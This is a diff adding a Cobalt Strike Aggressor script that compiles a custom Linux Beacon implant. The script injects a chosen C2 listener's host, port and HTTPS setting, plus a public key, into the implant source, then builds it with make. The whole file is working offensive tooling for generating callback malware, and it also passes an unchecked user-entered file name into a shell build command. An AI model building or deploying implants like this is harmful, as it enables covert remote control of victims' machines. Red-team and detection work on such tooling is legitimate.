@@ -1,0 +1,160 @@
+$ProjectLocation = "/home/ee/Tools/c2/CobaltStrike/"; # <-- SET THE DIRECTORY LOCATION CONTAINING THE PROJECT
+
+$CustomBeaconProjectFolder = $ProjectLocation . "/CobaltStrike-Linux-Beacon/";
+$GeneratePayloadDirectory = $CustomBeaconProjectFolder . "/generate-payload/";
+$ImplantSrcDirectory = $CustomBeaconProjectFolder . "/implant/";
+
+#######################################
+
+#   Generate Payload Menu Bar Below   #
+
+#######################################
+
+menubar("Custom Beacons", "generate"); # Creates a menu bar at the top
+popup generate {                # When clicked more buttons appear
+	item "Generate Custom Beacons" {  genBeaconMenu();  }  # Item 1 button that appears, creates pop up when clicked.
+};
+
+# Create a function that makes a pop up submenu for generating payloads with different options you can select
+sub genBeaconMenu {
+
+	# Create a dialog. Use &dialog_show to show it. Args in Order: 1. Title of the dialog; 2. A %dictionary mapping row names to default values; 3.A callback function that gets called when the user presses a &dbutton_action button.
+	# $1 is a reference to the dialog. $2 is the button name. $3 is a dictionary that maps each row's name to its value.
+	$dialog = dialog("Custom Beacon Generator", %(listener => "Select Listener: ", Beacon_name => "Beacon_x64"), &genPayload); 
+	
+	# Adds a description to a &dialog
+	dialog_description($dialog, "Creates a custom Beacon implant\n- Currently only supports HTTP/S listeners");
+	
+	# Adds a listener selection row to a &dialog. This row only shows listeners with stagers (e.g., windows/beacon_https/reverse_https).
+	drow_listener_stage($dialog, "listener", "Listener: "); # Alternative is drow_listener which only shows staged Beacons whereas this shows stageless and staged
+
+	# Adds a text field row to a &dialog
+	drow_text($dialog, "Beacon_name", "Executable Name: "); 
+	
+	# Adds an action button to a &dialog. When this button is pressed, the dialog closes and its callback is called.
+	dbutton_action($dialog, "Generate");
+	
+	# Shows a &dialog.
+	dialog_show($dialog);
+}
+
+# Callback function that gets called when you click Generate.
+sub genPayload {
+	#
+	# check if user is on a linux or windows box
+	#	
+	if (substr(cwd(), 0, 1) eq "/") {
+		$os = "linux";
+	} else {
+		$os = "windows";
+		show_message("Generating custom payloads on Windows has not yet been tested!");
+		return;
+	}
+	
+	$filename = $3['Beacon_name']; 
+
+	# Listener needs to be selected
+	if ($3['listener'] ismatch "Select Listener: ") {
+		berror($1, 'You did not select a Listener.');
+		show_message("Please select a Listener.");
+	}
+
+	# https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#listener_info
+	# PRINTF DEBUGGING
+	#foreach $key => $value (listener_info($3['listener']))
+	#{
+	#	println("$[15]key $value");
+   	#}
+
+	#
+	# This is for inserting the specified listener information into the implant
+	#
+	$HTTPSvalue = "0";
+	$ListenerName = $3['listener'];
+	$payloadType = listener_info($ListenerName, "payload");
+	if ($payloadType ne "windows/beacon_http/reverse_http" && $payloadType ne "windows/beacon_https/reverse_https")
+	{
+		show_message("This is an invalid listener type for the Linux Beacon! Only reverse_http and reverse_https are supported.");
+		return;
+	}
+	else if ($payloadType eq "windows/beacon_http/reverse_http")
+	{
+		$HTTPSvalue = "0";
+	}
+	else
+	{
+		$HTTPSvalue = "1";
+	}
+	$TargetServer = listener_info($ListenerName, "host");
+	$TargetPort = listener_info($ListenerName, "port");
+	
+	$command = "python3 InsertListenerInfo.py " . $TargetServer . " " . $TargetPort . " " . $HTTPSvalue;
+	println($command);
+	$process = exec($command, $null, $GeneratePayloadDirectory);
+	@data = readAll($process);
+	foreach $line (@data) {
+        println($line);
+    }
+	closef($process);
+
+	#
+	# Locate public key file
+	#
+	$publickeylocation = $CustomBeaconProjectFolder . "/generate-payload/publickey.txt";
+	if (!-exists $publickeylocation)
+    {
+        show_message("Public key file was not found! Make sure to generate public key. Check README for more information.");
+        return;
+    }
+	
+	#
+	# Insert public key into beacon.c
+	#
+	$command = "python3 InsertPublicKey.py";
+	println($command);
+	$process = exec($command, $null, $GeneratePayloadDirectory);
+	@data = readAll($process);
+	foreach $line (@data) {
+        println($line);
+    }
+	closef($process);
+	
+	#
+	# Build implant
+	#
+	$command = "make clean -f Makefile OUTPUT=" . $filename;
+	println($command);
+	$process = exec($command, $null, $ImplantSrcDirectory);
+	@data = readAll($process);
+	foreach $line (@data) {
+        println($line);
+    }
+    closef($process);
+	
+	$command = "make -f Makefile OUTPUT=" . $filename;
+	println($command);
+	$process = exec($command, $null, $ImplantSrcDirectory);
+	@data = readAll($process);
+	foreach $line (@data) {
+        println($line);
+    }
+    closef($process);
+
+	#
+	# Remove public key from beacon.c after compiling
+	#
+	$command = "python3 RemovePublicKey.py";
+	println($command);
+	$process = exec($command, $null, $GeneratePayloadDirectory);
+	@data = readAll($process);
+	foreach $line (@data) {
+        println($line);
+    }
+	closef($process);
+
+	#
+	# Yay
+	#
+	show_message("Your custom implant has been generated at " . $CustomBeaconProjectFolder . "/implant/bin/" . $filename);
+	
+}
